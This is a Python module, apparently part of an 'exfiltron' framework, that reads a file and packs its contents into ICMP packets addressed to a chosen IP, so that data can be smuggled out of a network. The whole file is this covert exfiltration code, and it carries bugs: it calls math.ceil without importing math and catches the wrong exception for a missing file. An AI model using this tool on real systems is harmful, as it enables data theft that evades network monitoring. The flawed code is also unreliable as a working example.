"""
* File: imcp.py
* Authors: Andrew Steiner, Thomas Daniels
* Purpose: This is the ICMP module to the exfiltron framework. Its purpose is
        to create the list of packets needed by the send function in exfiltron
        using ICMP as the method of exfiltration.
"""

from scapy.all import*
import os
import sys
from math import ceil

def icmp(destIP, filename, BytesPP):
    """
    args: destinationIP(str), filename(str), BytesPerPacket(int)
    return: list of packets
    """
    READ_ONLY = 'r'
    listOfPackets = []

    # TODO: make sure minICMP size <= BytesPP <= MTU
   
    # size is the number of bytes in the file
    try:
        size=os.stat(filename).st_size
    except LookupError:
        print("Could not find " + filename)
        print("Exiting...")
        sys.exit()
    
    # the number of packets to send should be the size of the
    # file divided by the number of bytes per packet
    numPackets = int(math.ceil(size / float(BytesPP)))
    
    # opening the specified file **needs error handling**
    OFile = open(filename, READ_ONLY)  
 
    # Read the specified amount of data from the file, append it to the packet
    # and add the packet to the list of packets to send
    for i in range(numPackets):
        OFile.seek(i*BytesPP)
        listOfPackets.append(IP(dst=destIP)/ICMP()/OFile.read(BytesPP))

    OFile.close()

    return listOfPackets
